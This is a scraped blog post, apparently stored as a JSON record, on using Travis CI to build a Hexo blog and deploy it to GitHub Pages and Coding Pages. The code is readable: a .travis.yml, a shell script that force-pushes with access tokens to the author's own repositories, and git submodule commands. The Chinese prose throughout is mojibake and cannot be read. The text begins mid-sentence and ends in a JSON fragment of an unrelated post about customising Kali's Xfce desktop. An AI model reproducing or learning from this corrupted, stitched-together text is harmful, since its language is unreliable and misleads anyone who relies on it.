çš„å†…å®¹å¯¹è¿™ä¸ªä»“åº“æ¥æ‰§è¡Œä¸€ç³»åˆ—linuxå’Œgitå‘½ä»¤å»è¾¾åˆ°ä½ çš„ç›®çš„ çš„å·¥å…·ã€‚\né‚£ä¹ˆè°ˆåˆ°ä»¤ç‰Œçš„è·å–ï¼Œè¿™ä¸ªå¹¶ä¸éº»çƒ¦ã€‚\nå¦‚æœæ˜¯ githubï¼Œç™»é™†åæ‰“å¼€è®¾ç½®ï¼Œç„¶åè¿›å…¥ Developer settings -\u0026gt;Personal access tokens ç‚¹å‡» Generate new tokenï¼Œç„¶åä¼šæç¤ºä½ é€‰æ‹©è¿™ä¸ªä»¤ç‰Œæ‹¥æœ‰çš„æƒé™ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦å¯¹ä»“åº“è¿›è¡Œæ“ä½œï¼Œé€‰ä¸­ repoå³å¯ã€‚\nç„¶åå¤åˆ¶é‚£ä¸€ä¸² token å…ˆä¿å­˜ä¸‹æ¥ã€‚\nå¦‚æœæ˜¯ codingï¼Œæ‰“å¼€ ä¸ªäººè®¾ç½® -\u0026gt; è®¿é—®ä»¤ç‰Œï¼Œç„¶åç‚¹å‡» æ–°å»ºä»¤ç‰Œï¼ŒåŒæ ·çš„ç»™äºˆä»“åº“çš„æ§åˆ¶æƒé™ï¼Œç„¶åå¤åˆ¶ä¿å­˜ç”Ÿæˆçš„ token ã€‚\nç„¶åæ‰“å¼€Travis CI ç½‘ç«™ï¼Œç„¶åç‚¹å‡»å³ä¸Šè§’çš„ç”¨githubç™»å½•ï¼Œç„¶ååŒæ­¥ä½ çš„ä»“åº“ï¼Œå†æ‰“å¼€ä½ éœ€è¦è‡ªåŠ¨éƒ¨ç½²çš„ä»“åº“å¼€å…³ï¼Œç‚¹å‡»è®¾ç½®è¿›å»æ·»åŠ  token å³å¯ã€‚ç›´æ¥ç»™ä¸¤å¼ å›¾ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯\næ¯ä¸ªToken è‡ªå®šä¹‰çš„ Name ä½ éœ€è¦è®°ä½ï¼Œå¾…ä¼šåœ¨å†™ .travis.yml çš„æ—¶å€™ä¼šç”¨åˆ° Display value in build log è¿™ä¸ªé€‰é¡¹åƒä¸‡ä¸è¦æ‰“å¼€ï¼Œå› ä¸ºlogæ˜¯å…¬ç½‘å¯è§çš„ ä»“åº“çš„ç»“æ„ ä¸Šé¢å®Œæˆäº†ï¼Œæˆ‘ä»¬æ¥è¯´è¯´ä»“åº“çš„ç»“æ„ã€‚\nä½ å¯ä»¥æŠŠç«™ç‚¹æºæ–‡ä»¶éƒ¨ç½²åˆ°ä¸€ä¸ªæ–°ä»“åº“ï¼ˆå‡å¦‚æ˜¯ new_repoï¼‰ï¼Œé‚£ä¹ˆä½ éœ€è¦æ›´æ”¹ä¸€ä¸‹ä¸Šé¢çš„è®¾ç½®ï¼Œä¸æ˜¯æ‰“å¼€åšå®¢ä»“åº“çš„å¼€å…³äº†ï¼Œè€Œæ˜¯æ¢æˆæ‰“å¼€ä½ éœ€è¦æ“ä½œçš„ä»“åº“ new_repoçš„å¼€å…³ï¼Œç„¶å Travis CI å†é€šè¿‡æˆ‘ä»¬è®¾ç½®å¥½çš„ .travis.yml è‡ªåŠ¨éƒ¨ç½²åˆ°åšå®¢ä»“åº“\nä½ ä¹Ÿå¯ä»¥æŠŠç«™ç‚¹æºæ–‡ä»¶éƒ¨ç½²åˆ°åšå®¢ä»“åº“ï¼ˆä¸‹æ–‡æˆ‘ä»¥ akkuman.github.io ä»£æ›¿ï¼‰çš„æ–°åˆ†æ”¯ï¼Œç„¶å Travis CI å†é€šè¿‡è¿™ä¸ªæ–°åˆ†æ”¯ä¸‹æˆ‘ä»¬è®¾ç½®å¥½çš„ .travis.yml è‡ªåŠ¨éƒ¨ç½²åˆ°åšå®¢ä»“åº“ akkuman.github.io ã€‚\nè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§æ–¹æ¡ˆï¼Œåªæ˜¯ä¸ªäººçˆ±å¥½ï¼Œä¸æƒ³å†å¤šå¼€ä¸€ä¸ªä»“åº“ã€‚\nä»“åº“çš„æ”¹é€  æ–°åˆ†æ”¯çš„å»ºç«‹ ç›´æ¥çœ‹ä¸‹é¢çš„å‘½ä»¤å’Œæ³¨é‡Šå§ã€‚\n1 2 3 4 5 6 # é¦–å…ˆæŠŠè‡ªå·±çš„åšå®¢ä»“åº“cloneåˆ°æœ¬åœ° git clone git@github.com:akkuman/akkuman.github.io.git cd akkuman.github.io.git # æˆ‘ä»¬å‡è®¾ä»“åº“ä¸‹çš„éƒ¨ç½²åˆ†æ”¯æ˜¯master # æˆ‘ä»¬å…ˆæ–°å»ºå¹¶åˆ‡æ¢åˆ°ä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œåˆ†æ”¯åæˆ‘è¿™é‡Œå–ä¸ºhexo git checkout -b hexo ç°åœ¨æˆ‘ä»¬å·²ç»åˆ‡æ¢åˆ°äº†æ–°åˆ†æ”¯ hexoï¼Œç´§æ¥ç€æˆ‘ä»¬åˆ é™¤ akkuman.github.io æ–‡ä»¶å¤¹ä¸‹é™¤äº† .git æ–‡ä»¶å¤¹çš„å…¶ä»–æ‰€æœ‰æ–‡ä»¶ã€‚\næˆ‘ä»¬æŠŠå…¶ä»–åœ°æ–¹ hexo init blog å‡ºæ¥çš„ blog ç«™ç‚¹æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°åˆšæ‰çš„ akkuman.github.io æ–‡ä»¶å¤¹ä¸‹ã€‚\nç«™ç‚¹ä¸»é¢˜çš„å¤„ç† è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„: ä¸çŸ¥é“ä½ çš„ä¸»é¢˜æ˜¯æ€ä¹ˆä¸‹è½½æ¥çš„ï¼Œæˆ‘å°±åˆ†ä¸º 1.ä¸»é¢˜æ˜¯ä¸€ä¸ª git ä»“åº“ 2.ä¸»é¢˜ä¸æ˜¯ä¸€ä¸ª git ä»“åº“ï¼Œæ‰€ä»¥ä¸»é¢˜å¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ª git ä»“åº“ï¼Œå¦‚æœä½ å¯¹ git ä¸ç†Ÿæ‚‰ï¼Œå»ºè®®ä¸è¦ git clone ä¸»é¢˜ä»“åº“ï¼Œè€Œæ˜¯ä¸‹è½½åˆ«äººçš„ release ç‰ˆã€‚\nåˆ¤æ–­ä¸€ä¸ªæ–‡ä»¶å¤¹æ˜¯ä¸æ˜¯ git ä»“åº“ï¼Œå°±æ˜¯çœ‹è¯¥æ–‡ä»¶å¤¹ç›®å½•ä¸‹æœ‰æ²¡æœ‰ä¸€ä¸ª .gitæ–‡ä»¶å¤¹ï¼Œæ³¨æ„å®ƒæ˜¯ä¸€ä¸ªéšè—æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥ä½ å‘ç°ä½ çš„ä¸»é¢˜æ˜¯ä¸€ä¸ª git ä»“åº“çš„æ—¶å€™ï¼Œä½ å¯ä»¥åˆ é™¤è¿™ä¸ªéšè—çš„ .gitæ–‡ä»¶å¤¹ã€‚\né‚£ä¹ˆæˆ‘ä»¬è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\nå¦‚æœæˆ‘ä»¬çš„ä¸»é¢˜æ–‡ä»¶å¤¹ä¹Ÿæ˜¯ä¸€ä¸ª git ä»“åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è¿™ä¸ªåšå®¢ä»“åº“çš„ hexo åˆ†æ”¯ä¸‹å°±åµŒå¥—äº†ä¸€ä¸ªä»“åº“ï¼Œå½“ç„¶ï¼Œgit ä¹Ÿç»™å‡ºäº†è§£å†³æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯å­æ¨¡å—ã€‚æ‰€ä»¥ç›®çš„å°±æ˜¯å‘Šè¯‰ä½ ï¼šå›¾çœäº‹å¯ä»¥ç›´æ¥ä½¿ç”¨é git ä»“åº“çš„ä¸»é¢˜ï¼Œä¸ç”¨æŠ˜è…¾å­æ¨¡å—ã€‚\nå¤šè¯´ä¸€ç‚¹å§ï¼š\nè¯´åˆ°å­æ¨¡å—ï¼Œå­æ¨¡å—æ˜¯SSHåè®®è¿˜æ˜¯HTTPSåè®®å¯¹åé¢æœ‰å½±å“ï¼Œä¸è¿‡æˆ‘åé¢ä¼šç»™ä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿ï¼Œçœ‹åé¢çš„æ³¨é‡Šå³å¯ã€‚\nè¿™ä¸ªå­æ¨¡å—ä½ æ˜¯ä½¿ç”¨SSHåè®®è¿˜æ˜¯HTTPSåè®®å°±çœ‹ä¸ªäººçˆ±å¥½äº†ï¼Œæˆ‘æ˜¯è‡ªå·± fork äº†åˆ«äººçš„ä»“åº“ç„¶åä¿®æ”¹äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä¸ºäº†æ–¹ä¾¿æœŸé—´è¿˜æ˜¯ä½¿ç”¨äº†SSHåè®®çš„ä»“åº“ã€‚\nç„¶åå­æ¨¡å—æ€ä¹ˆä½¿ç”¨å‘¢ï¼Ÿ\næ¯”å¦‚æˆ‘ä½¿ç”¨çš„ä¸»é¢˜ä»“åº“æ˜¯git@github.com:akkuman/hexo-theme-next.gitï¼Œç°åœ¨å‡è®¾æˆ‘ä»¬åœ¨åšå®¢ä»“åº“ akkuman.github.io ä¸‹ï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤æŠŠè¿™ä¸ªä¸»é¢˜ä»“åº“ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°ç«™ç‚¹ç›®å½•ä¸‹çš„ themes/next æ–‡ä»¶å¤¹ä¸‹ã€‚\n1 git submodule add git@github.com:akkuman/hexo-theme-next.git themes/next ç„¶åä½ çš„ç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ª .gitmodules æ–‡ä»¶ï¼Œå†…å®¹æ ¼å¼å¤§è‡´æ˜¯\n1 2 3 [submodule \u0026#34;themes/next\u0026#34;] path = themes/next url = git@github.com:akkuman/hexo-theme-next.git å…³äºå­æ¨¡å—çš„çŸ¥è¯†å¯ä»¥è‡ªå·±æŸ¥é˜…èµ„æ–™ï¼Œæˆ‘è¿™é‡Œä¸ç»†è¯´äº†ï¼Œå¾…ä¼šåœ¨åé¢æˆ‘ä¼šç»™å‡ºå‚è€ƒèµ„æ–™ã€‚\ngitéœ€è¦å¿½ç•¥çš„æ–‡ä»¶ git ä¾é  .gitignore æ–‡ä»¶åˆ¤æ–­é‚£äº›æ–‡ä»¶ä¸çº³å…¥ä»“åº“ï¼Œä¸€èˆ¬é€šè¿‡ hexo init å‘½ä»¤å‡ºæ¥çš„ç«™ç‚¹æ–‡ä»¶å¤¹ä¸‹éƒ½ä¼šæœ‰è¿™ä¹ˆä¸ªæ–‡ä»¶ã€‚æ²¡æœ‰ä¹Ÿæ²¡å…³ç³»ï¼Œè‡ªå·±æ–°å»ºä¸€ä¸ª .gitignore æ–‡ä»¶ï¼Œå†…å®¹ä¸º\n1 2 3 4 5 6 7 .DS_Store Thumbs.db db.json *.log node_modules/ public/ .deploy*/ node_modulesç›®å½•æ˜¯hexoåšå®¢å®ä¾‹çš„npmç¯å¢ƒä¾èµ–,ï¼Œæ®è¯´æ˜¯è´¨é‡æ¯”é»‘æ´è¿˜å¤§çš„ç‰©ä½“ï¼Œ æˆ‘ä»¬é€‰æ‹©å¿½ç•¥å®ƒï¼Œ åæ­£æœ€ååˆ°äº†Travisé‚£é‡Œä¹Ÿä¼šé‡æ–°è·‘ä¸€énpm install,ï¼Œè¿™äº›ä¸œè¥¿æœ¬æ¥ä¹Ÿä¼šåˆ äº†é‡æ¥, æ²¡æœ‰åŒæ­¥çš„æ„ä¹‰. publicç›®å½•æ˜¯hexoç”Ÿæˆçš„é™æ€æ–‡ä»¶ï¼Œ db.jsonæ˜¯æ•°æ®åº“æ–‡ä»¶,ï¼ŒåŒç†,ï¼Œç”±äºTravisæ„å»ºæµç¨‹ä¸­ä¼šæ‰§è¡Œhexo clean,ï¼Œéƒ½ä¸éœ€è¦åŒæ­¥ã€‚\n.travis.ymlçš„è®¾ç½® ä¸Šé¢çš„æ“ä½œå®Œæˆåï¼Œæˆ‘ä»¬å¼€å§‹ç€æ‰‹å†™ .travis.ymläº†ï¼Œå…ˆæä¾›ä¸€ä¸ªæœ€ç®€å•ä¹Ÿæ˜¯ç½‘ä¸Šåšå®¢æ•™ç¨‹é‡Œé¢æœ€å¤šçš„ç‰ˆæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 language: node_js # è®¾ç½®è¯­è¨€ node_js: stable # è®¾ç½®ç›¸åº”ç‰ˆæœ¬ install: - npm install # å®‰è£…hexoåŠæ’ä»¶ script: - hexo clean # æ¸…é™¤ - hexo g # ç”Ÿæˆ after_script: - cd ./public - git init - git config user.name \u0026#34;yourname\u0026#34; # ä¿®æ”¹name - git config user.email \u0026#34;your email\u0026#34; # ä¿®æ”¹email - git add . - git commit -m \u0026#34;Travis CI Auto Builder\u0026#34; - git push --force --quiet \u0026#34;https://${GH_TOKEN}@${GH_REF}\u0026#34; master:master # GH_TOKENæ˜¯åœ¨Travisä¸­é…ç½®tokençš„åç§° branches: only: - hexo #åªç›‘æµ‹hexoåˆ†æ”¯ï¼Œhexoæ˜¯æˆ‘çš„åˆ†æ”¯çš„åç§°ï¼Œå¯æ ¹æ®è‡ªå·±æƒ…å†µè®¾ç½® env: global: - GH_REF: github.com/yourname/yourname.github.io.git #è®¾ç½®GH_REFï¼Œæ³¨æ„æ›´æ”¹yourname è¿™ä¸ªæ˜¯é’ˆå¯¹ github ä»“åº“çš„æœ€ç®€ç‰ˆæœ¬ï¼Œä¸è¿‡æœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä»æ‰§è¡Œçš„å‘½ä»¤ä¸­ä¹Ÿèƒ½çœ‹åˆ°ï¼Œå°±æ˜¯éƒ¨ç½²åˆ° master åˆ†æ”¯çš„ç«™ç‚¹æ–‡ä»¶æ¯æ¬¡éƒ½ä¼š init ååœ¨æäº¤ï¼Œæ‰€ä»¥æ¯æ¬¡éƒ½åªæœ‰ä¸€æ¬¡ commit è®°å½•ï¼Œæˆ‘å»ºè®®ä½ æŠŠä¸‹é¢çš„çœ‹å®Œã€‚\næˆ‘å…ˆæŠŠæ–‡ä»¶ç»™å‡ºæ¥ï¼š\n.travis.yml æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 language: node_js node_js: stable cache: apt: true directories: - node_modules notifications: email: recipients: - akkumans@qq.com on_success: change on_failure: always # turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error git: submodules: false before_install: # Use sed to replace the SSH URL with the public URL if .gitmodules exists - test -e \u0026#34;.gitmodules\u0026#34; \u0026amp;\u0026amp; sed -i \u0026#39;s/git@github.com:/https:\\/\\/github.com\\//\u0026#39; .gitmodules # update the submodule in repo by manual - git submodule update --init --recursive - export TZ=\u0026#39;Asia/Shanghai\u0026#39; - npm install hexo-cli -g - chmod +x ./publish-to-gh-pages.sh install: - npm install script: - hexo clean - hexo g after_script: - ./publish-to-gh-pages.sh branches: only: - hexo env: global: # Github Pages - GH_REF: github.com/akkuman/akkuman.github.io.git # Coding Pages - CD_REF: git.coding.net/Akkuman/Akkuman.git æˆ‘æŠŠéœ€è¦æ‰§è¡Œçš„è„šæœ¬æ”¾åˆ°äº† publish-to-gh-pages.sh æ–‡ä»¶ã€‚\npublish-to-gh-pages.sh æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/bin/bash set -ev # get clone master git clone https://${GH_REF} .deploy_git cd .deploy_git git checkout master cd ../ mv .deploy_git/.git/ ./public/ cd ./public git config user.name \u0026#34;Akkuman\u0026#34; git config user.email \u0026#34;akkumans@qq.com\u0026#34; # add commit timestamp git add . git commit -m \u0026#34;Travis CI Auto Builder at `date +\u0026#34;%Y-%m-%d %H:%M\u0026#34;`\u0026#34; # Github Pages git push --force --quiet \u0026#34;https://${GITHUB_TOKEN}@${GH_REF}\u0026#34; master:master # Coding Pages git push --force --quiet \u0026#34;https://Akkuman:${CODING_TOKEN}@${CD_REF}\u0026#34; master:master è¯·æŠŠå¯¹åº”çš„ Akkuman å’Œ email è¿˜æœ‰ username æ”¹æˆä½ çš„é…ç½®ã€‚\nè¿™é‡Œæˆ‘ä¸è¯¦è§£é…ç½®ï¼Œå› ä¸ºè¿™ç¯‡æ–‡ç« å·²ç»èŠ±äº†å¾ˆé•¿æ—¶é—´äº†ï¼Œå¦‚æœå¤§å®¶æœ‰éœ€è¦æˆ‘å†è¯¦ç»†å†™ã€‚ä¸‹é¢æˆ‘ä¼šç»™å‡ºæˆ‘çš„ä»“åº“åœ°å€ï¼Œå¦‚æœæœ‰ä¸æ‡‚å¯ä»¥å»çœ‹çœ‹æˆ‘ä»“åº“ä¸‹çš„ä¾‹å­ã€‚\nè¯´ç€ä¸è¯¦è§£ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æœ‰ç‚¹è‡ªå·±è¸©è¿‡çš„å‘éœ€è¦æç‚¹ä¸€ä¸‹ï¼ŒTravis CI è¿›è¡Œ git clone æ“ä½œçš„æ—¶å€™ï¼Œé»˜è®¤æ˜¯å¼€å¯ --recursive å‚æ•°çš„ï¼Œä¹Ÿå°±æ˜¯å…‹éš†åº“çš„æ—¶å€™ä¼šé»˜è®¤åˆå§‹åŒ–å­æ¨¡å—ã€‚è¿™ä¸ªæ“ä½œæœ¬æ¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œé‚£ä¹ˆæˆ‘ä¸ºä»€ä¹ˆè¦å•ç‹¬æå‡ºæ¥è¯´ï¼Ÿ\næˆ‘ä¸Šé¢è¯´åˆ°äº†ï¼š\nè¯´åˆ°å­æ¨¡å—ï¼Œå­æ¨¡å—æ˜¯SSHåè®®è¿˜æ˜¯HTTPSåè®®å¯¹åé¢æœ‰å½±å“\né—®é¢˜å°±æ˜¯è¿™é‡Œäº†ï¼Œå¦‚æœä½ æ˜¯ç”¨çš„HTTPSåè®®ï¼Œæ ¹æ® .gitmodules æ–‡ä»¶é»˜è®¤åˆå§‹åŒ–å­æ¨¡å—çš„æ—¶å€™æ˜¯æ²¡é—®é¢˜ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨SSHåè®®ï¼Œä¸ç®¡æ˜¯ cloneã€pushè¿˜æ˜¯å…¶ä»–ç­‰ç­‰æ“ä½œï¼Œ æ˜¯è¦æ±‚æœ¬æœºä¸Šæœ‰ç§é’¥ï¼Œå¹¶ä¸”ä»“åº“é‚£è¾¹è¦æœ‰å¯¹åº”çš„å…¬é’¥æ‰å¯ä»¥ã€‚ä½†æ˜¯Travis CI è‡ªåŠ¨éƒ¨ç½²æ‰§è¡Œ clone çš„æ—¶å€™æ²¡æœ‰è¿™ä¸ªå…¬ç§é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿ç”¨HTTPSåè®®ï¼Œä½†æ˜¯æˆ‘ä½¿ç”¨çš„æ˜¯ .gitmodules æ–‡ä»¶é‡Œé¢å®šä¹‰çš„å­æ¨¡å—SSHåè®®å‘€ï¼æˆ‘åœ¨è¿™é‡Œä¹ŸæŸ¥äº†ä¸€ä¸‹ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸Šé¢çš„é‚£æ ·ã€‚èŠ‚é€‰å‡ºæ¥ï¼š\n1 2 3 4 5 6 7 8 9 # turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error git: submodules: false before_install: # Use sed to replace the SSH URL with the public URL if .gitmodules exists - test -e \u0026#34;.gitmodules\u0026#34; \u0026amp;\u0026amp; sed -i \u0026#39;s/git@github.com:/https:\\/\\/github.com\\//\u0026#39; .gitmodules # update the submodule in repo by manual - git submodule update --init --recursive å…ˆå…³é—­äº† Travis CI çš„é»˜è®¤åˆå§‹åŒ–å­æ¨¡å—åŠŸèƒ½ï¼Œç„¶ååé¢æˆ‘ä»¬å…ˆåˆ¤æ–­å­æ¨¡å—é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼ˆæ‰€ä»¥æˆ‘åˆšæ‰è¯´æœ€çœäº‹çš„å°±æ˜¯ä½¿ç”¨ releases ä¸»é¢˜ï¼Œä¹Ÿå°±æ˜¯ä¸å« .git æ–‡ä»¶å¤¹çš„ï¼Œå…·ä½“è§ä¸Šé¢ï¼‰ï¼Œç„¶ååˆ¤æ–­å­æ¨¡å—é…ç½®æ–‡ä»¶å¦‚æœå­˜åœ¨å­˜åœ¨ï¼Œå°±ä½¿ç”¨ sed æŠŠå‘½ä»¤æŠŠ .gitmodules å­æ¨¡å—é…ç½®æ–‡ä»¶ä¸­çš„SSHåè®®æ¢æˆHTTPSåè®®å†æ‰§è¡Œåé¢çš„æ“ä½œã€‚\nå¼€å¯è‡ªåŠ¨æ„å»ºä¹‹æ—… ç°åœ¨ä½ çš„åšå®¢ä»“åº“ akkuman.github.io æ–‡ä»¶å¤¹ä¸‹çš„ hexo åˆ†æ”¯ä¸‹çš„ä¸œè¥¿å·²ç»é…ç½®å¥½äº†ã€‚\næ–°åˆ†æ”¯æœ‰äº†ï¼Œ.travis.yml æ–‡ä»¶ä¹Ÿæœ‰äº†ã€‚\nä½ ç°åœ¨å¯ä»¥ç›´æ¥ push ä¸Šå»ï¼š\n1 2 3 git add . git commit -m \u0026#34;:constructin_worker: The introduction of Travis CI\u0026#34; git push origin hexo:hexo ç„¶åæ‰“å¼€ Travis CI ç½‘ç«™å³å¯çœ‹åˆ°ä½ çš„ç½‘ç«™æ­£åœ¨æ„å»ºï¼Œå¦‚æœæ„å»ºå¤±è´¥ï¼Œä¸Šé¢ä¹Ÿæœ‰è¯¦ç»†çš„æŠ¥é”™å¯ä»¥å¸®ä½ åˆ†æåŸå› ã€‚æ„å»ºæˆåŠŸåå³å¯çœ‹åˆ°ä½ ç„•ç„¶ä¸€æ–°çš„ç½‘ç«™äº†ã€‚\nä»¥åæ›´æ–° md å°±å¯ä»¥ç”¨ä¸Šé¢çš„å‘½ä»¤ push åˆ°ä»“åº“ï¼Œç„¶å Travis CI ä¼šè‡ªåŠ¨å¸®ä½ æ„å»ºåˆ° master åˆ†æ”¯\né¢˜å¤–è¯ ä¸ºäº†ä»¥åä¸ç”¨æ‰“\n1 git push origin hexo:hexo è€Œæ˜¯ç›´æ¥å¯ä»¥ä½¿ç”¨\n1 git push æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸Šæ¸¸åˆ†æ”¯ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ‰§è¡Œ git push origin hexo:hexoï¼Œå®ƒä¼šæç¤ºä½ ä½¿ç”¨\n1 git push --set-upstream origin hexo ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤å³å¯æŠŠæœ¬åœ°çš„ hexo çš„ä¸Šæ¸¸åˆ†æ”¯è®¾ç½®ä¸ºè¿œç¨‹ä»“åº“çš„ hexo åˆ†æ”¯ï¼Œä»¥å push å°±å¯ä»¥ç®€åŒ–å‘½ä»¤ä¸º git push äº†ã€‚\nå½“ç„¶ä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®ä¸Šæ¸¸åˆ†æ”¯ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠæœ¬åœ°çš„ hexo çš„ä¸Šæ¸¸åˆ†æ”¯è®¾ç½®ä¸ºè¿œç¨‹ä»“åº“çš„ hexo åˆ†æ”¯ï¼š\n1 git branch --set-upstream-to=origin/hexo hexo æˆ‘çš„ç«™ç‚¹ä»“åº“é…ç½®ç¤ºä¾‹ è§ akkuman/akkuman.github.io\nå‚è€ƒèµ„æ–™ Hexo + Travis CI åšå®¢ç®¡ç† ä½¿ç”¨Travis CIè‡ªåŠ¨æ„å»ºhexoåšå®¢ ä½¿ç”¨Travis CIè‡ªåŠ¨éƒ¨ç½²Hexoåšå®¢ Travis CIå®˜æ–¹å¸®åŠ©æ–‡æ¡£ gitä¸­submoduleå­æ¨¡å—çš„æ·»åŠ ã€ä½¿ç”¨å’Œåˆ é™¤ Git Submodule ç”¨æ³•ç­†è¨˜ CODINGå¸®åŠ©æ–‡æ¡£-ä¸ªäººè®¿é—®ä»¤ç‰Œ æä¸€å¥ä¸Šé¢çš„git push \u0026ndash;force \u0026ndash;quiet \u0026ldquo;https://Akkuman:${CODING_TOKEN}@${CD_REF}\u0026rdquo; ç½‘å€æ ¼å¼æ˜¯æŸ¥è¯¢çš„CODINGå¸®åŠ©æ–‡æ¡£\n","permalink":"https://www.hacktech.cn/post/use-travis-ci-update-hexo-to-github-and-coding.html","summary":"\u003cp\u003eæ¯æ¬¡æ¢ç³»ç»Ÿæˆ–æ¢ç”µè„‘ä¹‹åé‡æ–°éƒ¨ç½²åšå®¢æ€»æ˜¯å¾ˆè‹¦æ¼ï¼Ÿæƒ³åƒjekyllé‚£æ ·ï¼Œä¸€æ¬¡æ€§éƒ¨ç½²å®Œæˆåï¼Œä»¥åæœ¬åœ°ä¸ç”¨å®‰è£…ç¯å¢ƒç›´æ¥ \u003ccode\u003egit push\u003c/code\u003e å°±èƒ½ç”Ÿæˆåšå®¢ï¼Ÿé‚£æˆ‘æ¨èä½ åº”è¯¥ä½¿ç”¨ä½¿ç”¨ \u003ccode\u003eTravis CI\u003c/code\u003eäº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç¯‡æ–‡ç« æˆ‘ä»¬æ¥è®²è®²å¦‚ä½•åˆ©ç”¨ \u003ccode\u003eTravis CI\u003c/code\u003eæŠŠä½  \u003ccode\u003epush\u003c/code\u003e ä¸Šå»çš„åšå®¢æºæ–‡ä»¶ç›´æ¥ç”Ÿæˆå¯è®¿é—®çš„ç«™ç‚¹ï¼Œå¹¶ä¸”åŒæ­¥éƒ¨ç½²åˆ° \u003ccode\u003egithub pages\u003c/code\u003e å’Œ \u003ccode\u003ecoding pages\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç¯‡æ–‡ç« å‡è®¾ä½ å·²ç»å¯¹è¿™äº›é‡‡ç”¨ \u003ccode\u003egit\u003c/code\u003e ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„é™æ€åšå®¢æ‰˜ç®¡æœåŠ¡æœ‰æ‰€äº†è§£ï¼Œå¹¶ä¸”çŸ¥é“æ€ä¹ˆå»ç®€å•çš„ä½¿ç”¨ \u003ccode\u003egit\u003c/code\u003e ä»¥åŠäº†è§£ \u003ccode\u003ehexo\u003c/code\u003e å†™åšå®¢å‘å¸ƒåˆ°è¿™äº› \u003ccode\u003epages\u003c/code\u003e æœåŠ¡çš„æµç¨‹ã€‚å› æ­¤æœ¬æ–‡ä¼šå†™çš„è¾ƒä¸º\u003cstrong\u003eç®€ç•¥ï¼Œæ—¨åœ¨æŒ‡å‡ºå…³é”®çš„åœ°æ–¹ä»¥åŠæˆ‘é‡åˆ°çš„é—®é¢˜ã€é—®é¢˜äº§ç”Ÿçš„åŸå› å’Œæä¾›çš„è§£å†³æ–¹æ¡ˆ\u003c/strong\u003eï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©åˆ°å¤§å®¶ã€‚\u003c/p\u003e","title":"ä½¿ç”¨Travis CIè‡ªåŠ¨éƒ¨ç½²åšå®¢åˆ°github pageså’Œcoding pages"},{"content":"èµ·å›  è¿™ä¸¤å¤©æ¥å­¦æ ¡æŠŠç¡¬ç›˜åŸºæœ¬å…¨éƒ¨æ¸…ç©ºäº†ï¼Œæ‰€ä»¥ä»¥å‰çš„è™šæ‹Ÿæœºå°±éœ€è¦é‡æ–°å®‰è£…äº†ã€‚\nKali ä¸€ç›´ç”¨çš„æ˜¯ xfce ç‰ˆæœ¬ï¼Œè‡³äºä¸ºä»€ä¹ˆç”¨è¿™ä¸ªç‰ˆæœ¬ï¼Œæ˜¯å› ä¸ºæˆ‘æ„Ÿè§‰ gnome3 åœ¨è™šæ‹Ÿæœºä¸Šè¡¨ç°æ¬ ä½³ã€‚å½“ç„¶ï¼Œé»˜è®¤çš„ gnome3 çœ‹èµ·æ¥è¿˜æ˜¯ä¸é”™çš„ï¼Œè€Œ xfce é»˜è®¤çš„å°±çœ‹èµ·æ¥å¾ˆå¯’ç¢œäº†\né»˜è®¤çš„ Kali-Xfce æ˜¯è¿™ä¸ªæ ·å­çš„\nå…·ä½“è¿‡ç¨‹ä¸è¡¨äº†ï¼Œå¦‚æœæœ‰äººæœ‰éœ€è¦æˆ‘å†å‘å§ï¼Œæ¯•ç«Ÿè¿™æ¬¡ç¾åŒ–è¿‡ç¨‹æ²¡æœ‰è®°å½•ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å†é‡æ“ä¸€éäº†ï¼Œç›´æ¥ä¸Šç¾åŒ–åçš„æˆªå›¾å§\nç¾åŒ–æˆªå›¾ ä½¿ç”¨æ–¹æ³• åŸºç¡€ä½¿ç”¨ æ³¨æ„æ˜¯64ä½çš„é•œåƒï¼Œéœ€è¦cpuè™šæ‹ŸåŒ–å¼€å¯æ”¯æŒ\nç›´æ¥è§£å‹ç„¶åå¯¼å…¥vmwareï¼ˆversion \u0026gt;= 